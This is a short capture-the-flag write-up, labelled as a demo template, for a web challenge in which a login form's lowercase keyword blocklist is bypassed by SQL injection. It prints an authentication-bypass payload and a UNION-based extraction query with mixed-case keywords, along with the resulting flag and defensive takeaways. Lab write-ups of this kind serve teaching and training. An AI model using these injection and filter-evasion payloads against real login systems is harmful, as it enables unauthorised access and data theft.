Baby SQLi

Example CTF 2026  ·  category: web  ·  150 pts  ·  solved 2026-02-14

Challenge description

"Our login page is bulletproof — we filter all the dangerous words! Can you get in as admin?" — a login form at http://baby-sqli.example.

Note: this is a demo writeup so you can see the format. Replace it with a real one.

Recon

The form POSTs username and password. Submitting a single quote in the username field threw a SQL syntax error, confirming injection: 

POST /login
username=admin'&password=x

→ SQL syntax error near "'" at line 1

A quick probe showed the app rejected the words OR, UNION, and SELECT when written in lowercase — a naive blocklist.

Exploitation

The filter only matched exact lowercase keywords, so mixed case sailed right through. Classic authentication bypass with a commented-out password check: 

username=admin'-- -
password=anything

That logged us in as admin. To pull the flag out of an unlisted table I used a UNION-based injection with case-swapped keywords: 

username=x' UnIoN SeLeCt flag,2,3 FrOm secret_flags-- -

Flag

flag{c4se_1nsensit1ve_f1lters_are_useless}

Takeaways

  • Blocklists are the wrong tool — parameterized queries are the fix.
  • Always test keyword filters with case variation and inline comments.
